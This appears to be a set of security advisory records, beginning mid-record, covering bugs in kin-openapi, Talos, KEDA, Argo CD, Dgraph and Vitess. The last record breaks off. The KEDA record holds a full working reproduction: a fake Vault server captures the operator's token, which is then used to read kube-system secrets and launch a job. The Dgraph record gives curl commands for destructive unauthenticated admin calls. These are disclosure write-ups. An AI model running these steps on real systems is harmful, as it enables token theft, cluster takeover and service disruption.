- **Applications that load OpenAPI specs from untrusted or semi-trusted sources** (API gateways, spec linters/validators, mock servers, documentation generators). An attacker supplies a spec containing a circular combinator, and any subsequent request/response validation crashes the service. This is the primary remote-attacker scenario.
- **Applications serving a fixed, trusted spec that happens to contain a circular `allOf`/`anyOf`/`oneOf`.** Here any client request to the affected endpoint crashes the process. The spec author does not need malicious intent; a degenerate recursive combinator is enough. This is a latent reliability bug that becomes remotely triggerable once present.
body.summary: kin-openapi: Uncontrolled Recursion on Circular allOf/anyOf/oneOf Schemas Causes Fatal Process Crash

body.description:
## Summary

kin-openapi guards against `NaN` and `Inf` values in its built-in schema visitor (`visitJSON`) by returning `ErrSchemaInputNaN` / `ErrSchemaInputInf` when a `float64` input violates those constraints. For OAS 3.1 specs, however, `Schema.VisitJSON` routes through `useJSONSchema2020`, which hands the value directly to `santhosh-tekuri/jsonschema/v6` v6.0.2 without applying the same guard.

Inside `jsonschema/v6` v6.0.2, `numValidate` builds a `*big.Rat` from the input via `big.Rat.SetString(fmt.Sprintf("%v", v))`. For `NaN`/`Inf` this parse fails silently and returns `nil`. `numValidate` then dereferences the nil `*big.Rat` (in `math/big.(*Rat).Cmp`), producing a Go runtime panic.

An attacker delivers this by sending an HTTP request with `Content-Type: application/yaml` (or `application/x-yaml`) and a YAML body containing `.nan`, `.inf`, or `-.inf`. The `YamlBodyDecoder` decodes those tokens into `math.NaN()` / `math.Inf(±1)` (standard YAML 1.2 behavior), and they propagate to the unguarded `useJSONSchema2020` path whenever the schema declares a numeric constraint (`minimum`, `maximum`, `exclusiveMinimum`, `exclusiveMaximum`, or `multipleOf`).

## Details
### Root Cause

The built-in visitor `visitJSON` at `openapi3/schema.go:1968` guards NaN/Inf explicitly:

```go
case float64:
    if math.IsNaN(value) {
        return ErrSchemaInputNaN
    }
    if math.IsInf(value, 0) {
        return ErrSchemaInputInf
    }
```

For OAS 3.1 specs, `VisitJSON` dispatches to `useJSONSchema2020` (`openapi3/schema_jsonschema_validator.go:204`), which contains no such guard:

```go
func (schema *Schema) useJSONSchema2020(settings *schemaValidationSettings, value any) error {
    validator, err := newJSONSchemaValidator(schema)
    if err != nil {
        return schema.visitJSON(settings, value)
    }
    return validator.validate(value)      // value handed straight through
}
```

`jsonSchemaValidator.validate` calls `jsonschema/v6.Schema.Validate` (line 146), which reaches `numValidate` in v6.0.2. There, `big.Rat.SetString(fmt.Sprintf("%v", v))` returns `(nil, false)` for `NaN`/`Inf`, and the code dereferences the `nil` `*big.Rat` in `Rat.Cmp`, causing the panic.

## Proof of Concept

### Environment

- kin-openapi v0.144.0 (tag `v0.144.0`, commit `f0407d5`)
- santhosh-tekuri/jsonschema/v6 v6.0.2 (transitive dep)
- Go 1.26.7

### Spec

Minimal OAS 3.1 spec (`spec.yaml`) declaring a YAML body with a numeric constraint:

```yaml
openapi: '3.1.0'
info: { title: Test, version: '1.0' }
paths:
  /test:
    post:
      requestBody:
        required: true
        content:
          application/yaml:
            schema:
              type: number
              minimum: 0
      responses:
        '200': { description: OK }
```

### Trigger

A single `POST /test` with `Content-Type: application/yaml` and body `.nan`, `.inf`, or `-.inf`. All three variants panic:

```
=== RUN   TestNaNInf
[nan]    PANIC (confirms vuln): runtime error: invalid memory address or nil pointer dereference
[inf]    PANIC (confirms vuln): runtime error: invalid memory address or nil pointer dereference
[neginf] PANIC (confirms vuln): runtime error: invalid memory address or nil pointer dereference
```

### Panic stack trace (confirms exact chain)

```
panic: runtime error: invalid memory address or nil pointer dereference

math/big.(*Rat).Cmp(0x0, ...)                                       <- nil *big.Rat dereferenced
    C:/Program Files/Go/src/math/big/rat.go:492
github.com/santhosh-tekuri/jsonschema/v6.(*validator).numValidate(...)
    .../jsonschema/v6@v6.0.2/validator.go:525
github.com/santhosh-tekuri/jsonschema/v6.(*validator).validate(...)
    .../jsonschema/v6@v6.0.2/validator.go:168
github.com/santhosh-tekuri/jsonschema/v6.(*Schema).validate(...)
    .../jsonschema/v6@v6.0.2/validator.go:34
github.com/getkin/kin-openapi/openapi3.(*jsonSchemaValidator).validate(...)
    openapi3/schema_jsonschema_validator.go:146
github.com/getkin/kin-openapi/openapi3.(*Schema).useJSONSchema2020(...)   <- MISSING NaN/Inf guard
    openapi3/schema_jsonschema_validator.go:211
github.com/getkin/kin-openapi/openapi3.(*Schema).VisitJSON(...)
    openapi3/schema.go:1946
github.com/getkin/kin-openapi/openapi3filter.ValidateRequestBody(...)
    openapi3filter/validate_request.go:364
github.com/getkin/kin-openapi/openapi3filter.ValidateRequest(...)
    openapi3filter/validate_request.go:96
```

### net/http behavior (severity nuance)

Behind a standard `net/http` server, the panic is recovered per-connection. The client sees a dropped connection; the server process continues:

```
Sending POST /test body=.nan against real net/http server...
2026/08/25 http: panic serving 127.0.0.1:40625: runtime error: invalid memory address or nil pointer dereference
CLIENT ERROR (connection dropped): Post ".../test": EOF
Process still alive after request: true
```

This is a **recoverable panic**, unlike the recursion finding. `recover()` catches it (verified by capturing the panic value in a `defer` in the same goroutine). Non-`net/http` hosts or validation performed in an application-spawned goroutine are not covered by that recovery and would experience a full-process crash.

### Fix verification

Upgrading only the transitive dependency to `jsonschema/v6@v6.0.3` (via `go get github.com/santhosh-tekuri/jsonschema/v6@v6.0.3`) eliminates the panic entirely; all three payloads return a clean validation error:

```
[nan]    Returned normally, err = request body has an error: doesn't match schema: validation failed due to: at '': invalid jsonType float64
[inf]    Returned normally, err = request body has an error: doesn't match schema: validation failed due to: at '': invalid jsonType float64
[neginf] Returned normally, err = request body has an error: doesn't match schema: validation failed due to: at '': invalid jsonType float64
```

This confirms the upstream `jsonschema/v6` v6.0.3 release treats the NaN/Inf case as a bug and fixes it at the source. It also confirms `useJSONSchema2020` is the reachable path: patching only the transitive dep removes the panic without touching kin-openapi code.

## Why This Is a Vulnerability, Not by Design

- The library explicitly refuses NaN/Inf in its own visitor (`ErrSchemaInputNaN` / `ErrSchemaInputInf` at `schema.go:1968`). The stated policy is: these values are not allowed.
- The OAS 3.1 dispatch (`useJSONSchema2020`) simply omits the same guard — a coding gap, not a design decision.
- Upstream `jsonschema/v6` v6.0.3 fixes the same case as a bug. Two independent code owners agree it should not panic.
- The trigger is a single HTTP request body an unauthenticated client can send. There is no legitimate content-authoring reason to submit `.nan` / `.inf` as a numeric field.

## Impact

- **Per-request denial of service (net/http hosts).** Every crafted request kills its own connection with zero attacker cost. Sustained flooding degrades service reliability and log noise.
- **Full-process denial of service (non-net/http hosts or goroutine-spawned validation).** No `net/http` recovery wrapper is present; the whole process crashes on a single request.
- **Attack surface is any OAS 3.1 API that accepts YAML bodies with numeric constraints.** These constraints (`minimum`, `maximum`, `exclusiveMinimum`, `exclusiveMaximum`, `multipleOf`) are common on any numeric field with a range.
body.summary: kin-openapi: YAML NaN/Inf Values Bypass Built-in Guards and Panic via OAS 3.1 Validation Path

body.description:
### Summary
When generating a support bundle with `talosctl support` the credentials entered for private registries are included in the bundle.


### Details

Within the generated support bundle, inside `resources/registryconfigs.cri.talos.dev.yaml` the `auth` field of the spec is retained.
The same, potentially sensitive information is present within `etcfilespecs.files.talos.dev.yaml`.

### PoC

Simply run `talosctl -n [...] support` on a cluster with a `RegistryAuthConfig` resource 

### Impact

The problem itself is minor, however, anyone who has ever uploaded a support.zip bundle on a github issue, slack thread or public forum could have potentially leaked their internal authentication parameters for a private registry.

In most situations, if the network and credentials are set correctly, this should not be a problem. On the other hand, if the affected registry is publicly accessible, and the provided credentials have write access to it, this could lead to possibly serious consequences, from denial of service, to data loss and possibly existing tag hijacking leading to supply chain compromise, for the affected parties which were under the impression that the support bundle is redacted of sensitive information and thus can be shared publicly.


### Notes

Talos 1.14+ by default encrypts the support bundle to the age recipients specified (defaulting to siderolabs GitHub org members), so the impact is even lower.

### Environment

- Talos version: v1.13.0
- Kubernetes version: 1.35.3
- Platform: amd64
body.summary: Talos Linux: Support bundle does not redact registry credentials

body.description:
## Summary

A namespace admin who creates a `TriggerAuthentication` and a `ScaledObject` in their own namespace can make the KEDA operator send its own ServiceAccount token to a tenant-controlled URL. That token holds `["*"]/["*"] get` cluster-wide, so it reads every Secret in every namespace, plus `batch/jobs` and `horizontalpodautoscalers` create/delete cluster-wide, `*/scale` update on any workload, `validatingwebhookconfigurations` update (rewrite or disable cluster admission), and `apiservices` update (hijack aggregated API routing). This is effectively privilege escalation from namespace admin to cluster admin in real environments: a cluster-wide Secret read alone is enough to find a token for a more privileged ServiceAccount, and the cluster-wide `batch/jobs` create lets the attacker run a workload in any namespace whose Pod Security Admission level permits it (or that is PSA-exempt, such as `kube-system` , `kyverno`) to reach the node filesystem and a control-plane kubeconfig.

This is an incomplete fix of CVE-2025-68476: its content filter only requires the loaded file to be a JWT whose subject begins with `system:serviceaccount:`, which the operator's own projected token satisfies by construction. The destination field `hashiCorpVault.address` is unvalidated.

Finder credits: Artem Cherezov @cherez0ff, with Claude Opus 4.8

## Verified live

kind v1.31.2, kedacore/keda v2.20.0 (latest at the time of audit, <https://github.com/kedacore/keda>) installed from the unmodified release manifest `keda-2.20.0.yaml` (`ghcr.io/kedacore/keda:2.20.0`), default settings.

## Preconditions

1. The tenant holds `create` on `triggerauthentications.keda.sh` and `scaledobjects.keda.sh` in its own namespace (the documented KEDA tenant workflow), plus the built-in `edit` ClusterRole in that namespace. Often granted by a namespaced admin Role (`--verb='*' --resource='*.*'`) in multi-tenant environments.
2. KEDA is installed with default settings.

## Reproduction

### Cluster preparation (not part of the attack)

```sh
kind create cluster --image kindest/node:v1.31.2 --name keda-poc --kubeconfig ./kubeconfig
export KUBECONFIG=./kubeconfig

# Install KEDA v2.20.0 (unmodified vendor release manifest).
curl -sSL -o keda-2.20.0.yaml https://github.com/kedacore/keda/releases/download/v2.20.0/keda-2.20.0.yaml
kubectl apply --server-side -f keda-2.20.0.yaml
kubectl wait --for=condition=Established crd/triggerauthentications.keda.sh crd/scaledobjects.keda.sh --timeout=120s
kubectl -n keda rollout status deploy/keda-operator --timeout=180s

# Tenant identity: namespace admin in tenant-a.
kubectl create namespace tenant-a
kubectl -n tenant-a create serviceaccount tenant
kubectl -n tenant-a create rolebinding tenant-edit --clusterrole=edit --serviceaccount=tenant-a:tenant
kubectl -n tenant-a create role tenant-keda --verb=create,get --resource=triggerauthentications.keda.sh,scaledobjects.keda.sh
kubectl -n tenant-a create rolebinding tenant-keda --role=tenant-keda --serviceaccount=tenant-a:tenant

# Mint a tenant kubeconfig from a real TokenRequest token.
SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
CA=$(kubectl config view --minify --raw -o jsonpath='{.clusters[0].cluster.certificate-authority-data}')
TOKEN=$(kubectl -n tenant-a create token tenant --duration=24h)
cat > kubeconfig-tenant <<EOF
apiVersion: v1
kind: Config
clusters:
- name: kind
  cluster: { server: ${SERVER}, certificate-authority-data: ${CA} }
contexts:
- name: tenant
  context: { cluster: kind, user: tenant, namespace: tenant-a }
current-context: tenant
users:
- name: tenant
  user: { token: ${TOKEN} }
EOF

# Seed a "secret" canary in kube-system to make impact self-evident.
kubectl -n kube-system create secret generic poc-canary --from-literal=canary=KEDA-F1-CANARY-7f3a9c2e
```

### Attack

1. Deploy a listener in the tenant namespace that impersonates a HashiCorp Vault server. It logs the login request body and replies with a well-formed Vault auth envelope. The KEDA operator uses the Vault Go client, which issues the login as an HTTP `PUT`, so the listener must accept all methods.

```sh
kubectl --kubeconfig=./kubeconfig-tenant apply -f - <<'EOF'
apiVersion: v1
kind: ConfigMap
metadata: { name: fake-vault-src, namespace: tenant-a }
data:
  vault.py: |
    import http.server, socketserver, sys, json
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _h(self):
            ln=int(self.headers.get('Content-Length') or 0)
            body=self.rfile.read(ln) if ln else b''
            sys.stdout.write("VAULT-LOGIN %s %s\n%s\n"%(self.command,self.path,body.decode('utf-8','replace'))); sys.stdout.flush()
            r=json.dumps({"auth":{"client_token":"s.poc","lease_duration":3600,"renewable":True,"policies":["default"]}}).encode()
            self.send_response(200); self.send_header("Content-Type","application/json"); self.send_header("Content-Length",str(len(r))); self.end_headers(); self.wfile.write(r)
        do_GET=do_POST=do_PUT=do_DELETE=do_OPTIONS=do_HEAD=_h
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("0.0.0.0",8200),H) as s: s.serve_forever()
---
apiVersion: v1
kind: Pod
metadata: { name: fake-vault, namespace: tenant-a, labels: { app: fake-vault } }
spec:
  containers:
  - name: vault
    image: python:3.12-slim@sha256:090ba77e2958f6af52a5341f788b50b032dd4ca28377d2893dcf1ecbdfdfe203
    command: ["python3","/src/vault.py"]
    volumeMounts: [{ name: src, mountPath: /src }]
  volumes: [{ name: src, configMap: { name: fake-vault-src } }]
---
apiVersion: v1
kind: Service
metadata: { name: fake-vault, namespace: tenant-a }
spec:
  selector: { app: fake-vault }
  ports: [{ port: 8200, targetPort: 8200 }]
EOF
kubectl --kubeconfig=./kubeconfig-tenant -n tenant-a wait --for=condition=Ready pod/fake-vault --timeout=120s
```

2. Create the `TriggerAuthentication` (the primitive) and a `ScaledObject` with a `cron` trigger referencing it. With `authentication: kubernetes` and no `credential` block, KEDA defaults `credential.serviceAccount` to the operator pod's own token path.

```sh
kubectl --kubeconfig=./kubeconfig-tenant apply -f - <<'EOF'
apiVersion: keda.sh/v1alpha1
kind: TriggerAuthentication
metadata: { name: vault-auth, namespace: tenant-a }
spec:
  hashiCorpVault:
    address: http://fake-vault.tenant-a.svc:8200   # tenant-controlled destination, no validation
    authentication: kubernetes
    mount: kubernetes
    role: poc
    secrets:
    - { parameter: anything, key: anything, path: secret/data/anything }
---
apiVersion: keda.sh/v1alpha1
kind: ScaledObject
metadata: { name: poc-so, namespace: tenant-a }
spec:
  scaleTargetRef: { name: poc-target }
  pollingInterval: 5
  minReplicaCount: 0
  maxReplicaCount: 2
  triggers:
  - type: cron
    metadata: { timezone: UTC, start: "0 * * * *", end: "30 * * * *", desiredReplicas: "1" }
    authenticationRef: { name: vault-auth }
---
apiVersion: apps/v1
kind: Deployment
metadata: { name: poc-target, namespace: tenant-a }
spec:
  replicas: 1
  selector: { matchLabels: { app: poc-target } }
  template:
    metadata: { labels: { app: poc-target } }
    spec:
      containers: [{ name: pause, image: registry.k8s.io/pause:3.10 }]
EOF
```

3. The operator reconciles the `ScaledObject`, builds the scaler, resolves the `authenticationRef`, and PUTs its own ServiceAccount token to the listener as the Vault login body. Read it back:

```sh
sleep 20
kubectl --kubeconfig=./kubeconfig-tenant -n tenant-a logs pod/fake-vault | grep -A1 'VAULT-LOGIN PUT'
# VAULT-LOGIN PUT /v1/auth/kubernetes/login
# {"jwt":"eyJhbGciOiJSUzI1NiIs...","role":"poc"}
```

4. Build a kubeconfig from the stolen token and use it. The token authenticates as the operator ServiceAccount and reads the kube-system Secret the tenant could not read directly:

```sh
STOLEN=$(kubectl --kubeconfig=./kubeconfig-tenant -n tenant-a logs pod/fake-vault \
  | sed -n 's/.*"jwt":"\([^"]*\)".*/\1/p' | head -1)
cat > kubeconfig-stolen <<EOF
apiVersion: v1
kind: Config
clusters:
- name: kind
  cluster: { server: ${SERVER}, certificate-authority-data: ${CA} }
contexts:
- name: stolen
  context: { cluster: kind, user: stolen }
current-context: stolen
users:
- name: stolen
  user: { token: ${STOLEN} }
EOF

kubectl --kubeconfig=./kubeconfig-stolen auth whoami
# Username  system:serviceaccount:keda:keda-operator

kubectl --kubeconfig=./kubeconfig-stolen -n kube-system get secret poc-canary -o jsonpath='{.data.canary}' | base64 -d
# KEDA-F1-CANARY-7f3a9c2e

# The token also creates workloads cluster-wide via batch/jobs; a Job lands a pod in kube-system.
kubectl --kubeconfig=./kubeconfig-stolen -n kube-system create job pwn --image=busybox -- sh -c 'sleep 60'
# job.batch/pwn created
kubectl --kubeconfig=./kubeconfig-stolen -n kube-system get pods -l job-name=pwn
# pwn-q5j5s   1/1   Running   0   8s
```

## Root cause

A namespace tenant should not be able to make the operator authenticate to a tenant-controlled server using the operator's own cluster-privileged identity. The destination address is fully tenant-controlled and unvalidated, and the credential the operator presents defaults to its own ServiceAccount token. The content filter added for the prior arbitrary-file-read advisory checks only that the loaded bytes look like a Kubernetes ServiceAccount token, which is exactly the shape of the operator's own token, so it does not constrain the credential to one the tenant is entitled to use.
body.summary: KEDA: Privilege escalation from namespace admin to cluster admin via KEDA TriggerAuthentication

body.description:
### Impact

Argo CD checks an Application's AppProject before it creates resources during a sync. That check covers destination namespaces and servers, cluster-scoped resource allow and deny lists, and namespaced resource allow and deny lists, including resource names. PreDelete and PostDelete hooks skip it. When the Application is deleted, Argo CD creates those hooks with the application-controller's credentials on the destination cluster.

All versions from v2.10.0 onward are affected, including every currently supported release. v2.9.22 and earlier are not. PostDelete hooks were introduced in [dcc17f70bf](https://github.com/argoproj/argo-cd/commit/dcc17f70bf7db973fe480b8b613189b2c5ac4b4b) (2023-12-18, [#16595](https://github.com/argoproj/argo-cd/pull/16595)) and first released in v2.10.0. That creation path has never applied the project check. PreDelete hooks, added in [3bf3d8a212](https://github.com/argoproj/argo-cd/commit/3bf3d8a2124e772ac651f3fd42375c4e9b8008af) (2025-12-05, [#22288](https://github.com/argoproj/argo-cd/pull/22288)) and first released in v3.3.0, use the same path. v3.2.12 and earlier do not have PreDelete hooks. PreSync, Sync, PostSync, and SyncFail hooks still go through the project check.

A user who can push to the Git repository an Application syncs from can commit a hook whose namespace, group, kind, or name the AppProject would refuse on sync. The controller adds the delete finalizer when it sees the hook, and the Application stays Synced until someone deletes it. Deleting the Application creates the hook. What that can reach is bounded by the application-controller's access to the destination cluster. In a typical install that access is broad, so a tenant can create a cluster-scoped object such as a `ClusterRoleBinding`, or an object in a namespace the project does not allow. A hook with no deletion policy is removed after it succeeds. A deletion policy that does not remove the hook on success leaves the object in the cluster. A hook such as a Job can create further objects that Argo CD does not clean up.

### Patches

A patch for this vulnerability has been released in the following Argo CD versions:

* v3.6.0-rc2
* v3.5.4
* v3.4.10
* v3.3.15

The fix applies the same AppProject destination and resource checks used on sync before creating a PreDelete or PostDelete hook.

Argo CD 2.x and 3.0 through 3.2 are out of support and will not receive a patch. Upgrade to a patched 3.3 or newer release.

### Workarounds

There is no configuration setting that applies the project check to delete hooks while those hooks stay in use.

* Do not grant untrusted users write access to Git repositories that back Applications in restrictive AppProjects.
* Limit who can delete Applications. Deletion is what runs PreDelete and PostDelete hooks.
* Tighten the application-controller's Kubernetes access so a hook cannot reach sensitive namespaces or APIs.

### Credits

The Argo CD team would like to thank @RealFakeAccount, @AdamKorcz, @0xshylines, @thevilledev, @HenriWilliams, @cherez0ff, @ARSB1, and @zwindler for responsibly disclosing this issue according to our [security reporting guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability).

### References

* PostDelete introducing commit: [dcc17f70bf7db973fe480b8b613189b2c5ac4b4b](https://github.com/argoproj/argo-cd/commit/dcc17f70bf7db973fe480b8b613189b2c5ac4b4b) ([#16595](https://github.com/argoproj/argo-cd/pull/16595)), first released in v2.10.0
* PreDelete introducing commit: [3bf3d8a2124e772ac651f3fd42375c4e9b8008af](https://github.com/argoproj/argo-cd/commit/3bf3d8a2124e772ac651f3fd42375c4e9b8008af) ([#22288](https://github.com/argoproj/argo-cd/pull/22288)), first released in v3.3.0
* [AppProject specification](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/)
* [Resource hooks](https://argo-cd.readthedocs.io/en/stable/user-guide/resource_hooks/)

### For more information

* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)
* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd
body.summary: Argo CD: AppProject destination-namespace and resource restrictions bypassed by PreDelete/PostDelete resource hooks

## Summary

`openapi3filter.ValidationHandler.Middleware` validates requests with kin-openapi's
legacy router, which selects an OpenAPI operation from the decoded `URL.Path`. The
method is documented as implementing `gorilla/mux.MiddlewareFunc`, but a downstream
gorilla/mux router configured with `UseEncodedPath()` selects its handler from the
encoded representation (`URL.RawPath`).

An unauthenticated request such as `/public%2Fstatus` can therefore be validated as an
intentionally public operation (`/public/status`) and then dispatched to a protected
operation (`/{id}`). The configured, rejecting `AuthenticationFunc` is never invoked,
and the protected downstream handler runs.

This is distinct from GHSA-r277-6w6q-xmqw. The behavior below uses an explicit
authentication callback that rejects missing credentials and remains reproducible
after the v0.144.0 fix for the unsafe default callback.

## Affected products

- Product: `github.com/getkin/kin-openapi`
- Component: `openapi3filter.ValidationHandler.Middleware`
- Confirmed post-GHSA affected releases: v0.144.0, v0.145.0, and v0.146.0
- Reporter attestation: each listed release was checked out separately, the attached
  single-file test was copied into `openapi3filter/`, and that test passed; maintainers
  should independently confirm the version range
- Confirmed affected development revision: `d33e44e67734dcde81b576582185e1343fb3985d`
- v0.143.0 also reproduces this mechanism, but GHSA-r277-6w6q-xmqw already provides a
  simpler bypass on that release; the distinct post-fix claim starts at v0.144.0
- Earlier releases: not tested; please treat the introduction boundary as unknown

## Security impact

An unauthenticated remote requester can reach a handler whose OpenAPI operation
requires authentication when all of the following are true:

1. the application uses `ValidationHandler.Middleware` as the security gate;
2. the downstream router preserves and interprets an encoded path, such as
   gorilla/mux with `UseEncodedPath()`;
3. a public exact route and a protected parameterized route overlap after decoding;
4. the public and protected operations expose the same HTTP method;
5. the protected handler relies on the validation layer's security decision.

The protected operation's path-parameter value is constrained: it is an encoded
representation that decodes to a public literal path (`public%2Fstatus` in this PoC),
not an arbitrary attacker-selected identifier. A protected operation without a
compatible parameterized path is not reachable through this specific mechanism.

- Primitive: the security decision is made for a different OpenAPI operation than the
  operation dispatched by the application router.
- Demonstrated impact: a protected handler executes while the explicitly rejecting
  `AuthenticationFunc` is never invoked.
- Impact ceiling: confidentiality or integrity loss when the reachable protected
  handler has that authority; the PoC does not demonstrate data disclosure or state
  modification.
- Availability impact: not demonstrated.

## Root cause

At the confirmed development revision:

- `openapi3filter/validation_handler.go`: `ValidationHandler.Load` constructs
  `routers/legacy.NewRouter` unconditionally.
- `routers/legacy/router.go`: route selection uses the decoded request path.
- `routers/gorillamux/router.go`: the kin-openapi gorilla router constructs a
  gorilla/mux router with `UseEncodedPath()`.
- `ValidationHandler.Middleware` forwards the unchanged request after validation.

The component making the authentication decision and the component dispatching the
handler can therefore disagree about the selected operation.

## Reproduction

The attached PoC uses a real `net/http` server, an explicit API-key callback that
rejects missing credentials, and a downstream gorilla/mux router with
`UseEncodedPath()`.

From a kin-openapi checkout, copy the self-contained attachment
`encoded_path_route_confusion_test.go.txt` into `openapi3filter/` as
`encoded_path_route_confusion_test.go`, then run:

```sh
go test -v ./openapi3filter -run '^TestEncodedPathAuthorizationBypass$' -count=1
```

Expected attack observation:

```text
status=202 downstream_route=/{id} protected_id=public%2Fstatus authentication_calls=0
wiring=Router.Use status=202 downstream_route=/{id} protected_id=public%2Fstatus authentication_calls=0
```

Controls included in the test show that:

- `/ordinary` selects the protected operation, invokes authentication once, and is
  rejected with HTTP 401;
- `/public/status` reaches only the intentionally public handler;
- the encoded request reaches the protected `/{id}` handler with HTTP 202 while the
  authentication callback remains uncalled;
- both external wrapping and the documented
  `router.Use(validationHandler.Middleware)` wiring reproduce the same result.

## Reverse-proxy reachability

The same request was reproduced through Nginx 1.31.3 using the official
`nginx:alpine` image digest
`sha256:4a73073bd557c65b759505da037898b61f1be6cbcc3c2c3aeac22d2a470c1752`.

The exact container invocation was:

```sh
docker run --rm --name kin-openapi-nginx \
  --add-host=host.docker.internal:host-gateway \
  -p 18081:8080 -p 18082:8081 \
  -v "$PWD/poc/nginx.conf:/etc/nginx/nginx.conf:ro" \
  nginx:alpine
```

Container port 8080 uses `proxy_pass http://host.docker.internal:18080;` without a
replacement URI. Host port 18081 therefore preserved `/public%2Fstatus`; the protected
handler returned HTTP 202 and the
authentication callback remained at zero calls. With
`proxy_pass http://host.docker.internal:18080/;` on container port 8081 / host port
18082, Nginx canonicalized the upstream URI; both layers selected `/public/status` and
the bypass did not occur.

Nginx access-log observations:

```text
server_port=8080 "GET /public%2Fstatus HTTP/1.1" 202 0 "curl/8.7.1"
server_port=8081 "GET /public%2Fstatus HTTP/1.1" 204 0 "curl/8.7.1"
server_port=8080 "GET /ordinary HTTP/1.1" 401 0 "curl/8.7.1"
```

The response route headers were `X-Poc-Route: /{id}` on the preserving listener and
`X-Poc-Route: /public/status` on the canonicalizing listener. Backend observations for
the two requests were:

```text
request_uri="/public%2Fstatus" path="/public/status" raw_path="/public%2Fstatus" auth_before=0
completed request_uri="/public%2Fstatus" auth_after=0
request_uri="/public/status" path="/public/status" raw_path="" auth_before=0
completed request_uri="/public/status" auth_after=0
```

This control shows that upstream path handling is a deployment precondition rather
than claiming that every proxy configuration is affected.

The canonical protected control produced:

```text
request_uri="/ordinary" path="/ordinary" raw_path="" auth_before=0
completed request_uri="/ordinary" auth_after=1
```

## Suggested remediation

The authentication layer and downstream dispatcher must select the same OpenAPI
operation from the same request representation.

Potential approaches:

1. make `ValidationHandler` accept a caller-supplied `routers.Router` and require it to
   match downstream routing semantics;
2. document that `NewValidator` already accepts a router but is safe only when the
   supplied router selects operations using the same semantics as the dispatcher;
   callers must also supply an `AuthenticationFunc` through `ValidationOptions`, or
   protected requests fail with the existing missing-authentication-service error;
3. as an interim hardening option, make `ValidationHandler` fail closed on an encoded
   path separator when `URL.Path` and `URL.RawPath` can select different operations,
   and verify this behavior against the full suite;
4. document the route-identity requirement and add encoded-separator regression tests.

Replacing the legacy router with the kin-openapi gorilla router closes this PoC, but a
local compatibility check changed two existing missing-path-parameter tests from HTTP
400 semantics to route-not-found HTTP 404 semantics. A direct router swap is therefore
not a fully validated drop-in fix.

## Public-reference triage

The public advisory list and related path-encoding reports reviewed on 2026-08-18 did
not describe this authentication-boundary crossing. Relevant nearby reports include
issues #397, #1089, and #1105 and PR #400. This search is not proof of novelty; please
deduplicate against private reports.

## Credit

Preferred credit: Satoru Kanno (GMO CONNECT Inc., GMO Internet Group, Inc.)

body.description: ### Summary Dgraph `v25.3.8` exposes a Zero HTTP administrative surface that is unauthenticated when port `6080` is reachable. The exposed routes include: - `/state` - `/assign` - `/removeNode` - `/moveTablet` An unauthenticated request to `/removeNode?id=1&group=0` on a single-node standalone deployment breaks the Zero control plane and leaves Alpha repeatedly failing to reconnect to `localhost:5080`. ### Details The issue exists because Zero administrative HTTP endpoints are registered directly without any authentication or IP-whitelist wrapper. Relevant code paths: - `worker/server_state.go:41` - `dgraph/cmd/zero/run.go:295-301` - `dgraph/cmd/zero/http.go:106-129` - `dgraph/cmd/zero/zero.go:475-477` The relevant behavior is: - `disable-admin-http=false` by default - `/removeNode` accepts attacker-controlled `id` and `group` - `removeNode` forwards those directly into `Server.RemoveNode` - for `group=0`, `Server.RemoveNode` immediately calls `ProposePeerRemoval` This means a remote unauthenticated caller can directly trigger destructive membership operations if `6080` is exposed. ### PoC ### Read state without authentication ```bash curl -i http://127.0.0.1:6080/state ``` Observed response included: - Zero node `id=1` - `groupId=0` - `leader=true` - cluster topology and tablet state ### Write-capable route without authentication ```bash curl -i 'http://127.0.0.1:6080/assign?what=nsids&num=1' ``` Observed response: ```text HTTP/1.1 200 OK ... {"startId":"1", "endId":"1", "readOnly":"0"} ``` This confirms the admin plane is not merely informational. ### Destructive unauthenticated removeNode ```bash curl -i 'http://127.0.0.1:6080/removeNode?id=1&group=0' ``` Observed result: ```text curl: (52) Empty reply from server ``` Immediately afterward: ```bash curl -i http://127.0.0.1:6080/health ``` Observed result: ```text curl: (56) Recv failure: Connection reset by peer ``` Alpha health was still locally reachable, but Alpha logs began repeatedly reporting: ```text dial tcp [::1]:5080: connect: connection refused ``` This confirms the request reached the destructive path and disrupted the Zero control plane. ### Impact Any deployment that exposes Zero HTTP on `6080` exposes destructive unauthenticated administrative capabilities. An attacker can: - read cluster topology and control-plane metadata - allocate IDs and timestamps - invoke destructive membership actions - disrupt the Zero control plane - indirectly destabilize Alpha nodes that depend on Zero connectivity This is a high-value unauthenticated administrative exposure and, in the reproduced case, a practical denial of service against the control plane.

body.description:
From: xylove21 To: security@vitess.io Subject: [Security Report] Vitess vttablet /twopcz reflected XSS Date: Tue, 24 Jun 2026 14:30:00 +0800 ## Summary The `twopczHandler` in `go/vt/vttablet/tabletserver/twopcz.go` (line 185) reflects the `Action` and `dtid` form values directly into the HTML response body via `fmt.Fprintln(w, msg)` — **without HTML escaping**. The response is served as `text/html; charset=utf-8`, and Vitess's default `acl` policy is **allow-all**, so the endpoint is reachable by anyone who can hit the vttablet's HTTP port (default `15999`, multiplexed with gRPC and MySQL wire-protocol ports). A crafted `Action` or `dtid` value yields a **reflected XSS** that executes in the operator's browser with same-origin access to the vttablet's debug endpoints. This includes `/queryz` (live query plans), `/querylogz` (recent queries with bound values), `/txlogz` (transactions), `/debug/env` (environment variables — may include MySQL/topology credentials), `/debug/vars` (expvar stats), and `/debug/pprof/*` if enabled. The bug was introduced before v20.0.0 (long-standing) and was silently fixed in commit `3140c1846c` (merged 2026-06-09, PR #20255, "tabletserver: escape reflected form values in twopcz handler"). The fix replaces `fmt.Fprintln(w, msg)` with `fmt.Fprintln(w, html.EscapeString(msg))`. **No released version of Vitess contains the fix** — the fix lives only on `main` (current tip `33a3c0fafe69`, 2026-06-23). There is **no CVE, GHSA, or OSV entry** for this specific bug (verified 2026-06-24 against GitHub Advisory Database, OSV.dev, and NVD). ## Impact | Field | Value | |-------|-------| | **Type** | Reflected Cross-Site Scripting (XSS) | | **CVSS 3.1** | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N` = **7.7 HIGH** | | **Attack Vector** | Network (vttablet HTTP port 15999, 